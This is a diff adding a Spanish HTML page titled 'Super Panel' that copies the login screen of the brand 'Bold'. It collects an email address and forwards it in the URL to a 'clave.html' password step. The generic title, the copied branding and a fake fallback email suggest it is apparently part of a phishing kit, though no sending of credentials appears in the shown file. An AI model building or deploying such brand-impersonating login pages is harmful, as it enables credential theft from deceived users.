@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Super Panel</title>
+  <link rel="icon" type="image/x-icon" href="favicon.ico">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      min-height: 100vh;
+      background: #eaeaf6;
+      background-image:
+        radial-gradient(ellipse 60% 50% at 50% 10%, rgba(255,255,255,0.65) 0%, transparent 70%),
+        radial-gradient(ellipse 80% 60% at 80% 5%, #d8d8f0 0%, #eaeaf6 60%);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    }
+
+    .back-btn {
+      position: fixed;
+      top: 28px;
+      left: 28px;
+      font-size: 22px;
+      color: #1a1a5e;
+      cursor: pointer;
+      text-decoration: none;
+      line-height: 1;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 480px;
+      padding: 40px 60px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .logo {
+      width: 64px;
+      height: 64px;
+      border-radius: 50%;
+      overflow: hidden;
+      margin-bottom: 28px;
+      flex-shrink: 0;
+    }
+
+    .logo svg {
+      width: 100%;
+      height: 100%;
+    }
+
+    h1 {
+      font-size: 20px;
+      font-weight: 700;
+      color: #1a1a5e;
+      text-align: center;
+      margin-bottom: 8px;
+    }
+
+    .subtitle {
+      font-size: 14px;
+      color: #7a7aaa;
+      text-align: center;
+      margin-bottom: 36px;
+    }
+
+    .form-group {
+      width: 100%;
+      margin-bottom: 16px;
+    }
+
+    label {
+      display: block;
+      font-size: 14px;
+      font-weight: 600;
+      color: #3d5afe;
+      margin-bottom: 8px;
+    }
+
+    input[type="email"] {
+      width: 100%;
+      padding: 16px 20px;
+      border: none;
+      border-radius: 12px;
+      background: #ffffff;
+      font-size: 15px;
+      color: #1a1a5e;
+      outline: none;
+      box-shadow: 0 1px 4px rgba(0,0,0,0.06);
+    }
+
+    input[type="email"]::placeholder {
+      color: #b0b0cc;
+    }
+
+    .remember {
+      width: 100%;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 32px;
+      cursor: pointer;
+    }
+
+    .remember input[type="checkbox"] {
+      width: 18px;
+      height: 18px;
+      accent-color: #3d5afe;
+      cursor: pointer;
+      flex-shrink: 0;
+    }
+
+    .remember span {
+      font-size: 14px;
+      color: #5a5a8a;
+    }
+
+    .btn-ingresar {
+      width: 100%;
+      padding: 18px;
+      background: #f0243a;
+      border: none;
+      border-radius: 50px;
+      color: #ffffff;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+
+    .btn-ingresar:hover {
+      background: #d41e33;
+    }
+  </style>
+</head>
+<body>
+
+  <a class="back-btn" href="#">&#8249;</a>
+
+  <div class="container">
+    <div class="logo">
+      <svg xmlns="http://www.w3.org/2000/svg" width="64" height="65" viewBox="0 0 64 65" fill="none">
+        <path d="M6.40061 34.9166H57.5984C56.3674 47.9039 45.3593 58.1004 31.9974 58.1004C18.6355 58.1004 7.62951 47.9039 6.39844 34.9166H6.40061ZM31.9995 6.90039C18.6398 6.90039 7.63168 17.1011 6.40061 30.0885H57.5984C56.3674 17.1011 45.3593 6.90039 31.9974 6.90039H31.9995Z" fill="url(#g1)"/>
+        <defs>
+          <linearGradient id="g1" x1="31.7867" y1="6.9004" x2="31.7867" y2="58.1004" gradientUnits="userSpaceOnUse">
+            <stop offset="0.172326" stop-color="#EE424E"/>
+            <stop offset="0.833333" stop-color="#121E6C"/>
+          </linearGradient>
+        </defs>
+      </svg>
+    </div>
+
+    <h1>¡Te damos la bienvenida a Bold!</h1>
+    <p class="subtitle">Ingresa con el correo registrado.</p>
+
+    <div class="form-group">
+      <label for="email">Correo electrónico</label>
+      <input type="email" id="email" placeholder="Correo electrónico" autocomplete="off">
+    </div>
+
+    <label class="remember">
+      <input type="checkbox" checked>
+      <span>Recordar mi información.</span>
+    </label>
+
+    <button class="btn-ingresar" onclick="goNext()">Ingresar</button>
+
+  <script>
+    function goNext() {
+      const em = document.getElementById('email').value.trim() || 'usuario@gmail.com';
+      window.location.href = 'clave.html?email=' + encodeURIComponent(em);
+    }
+    document.getElementById('email').addEventListener('keydown', e => { if (e.key === 'Enter') goNext(); });
+  </script>
+  </div>
+
+</body>
+</html>
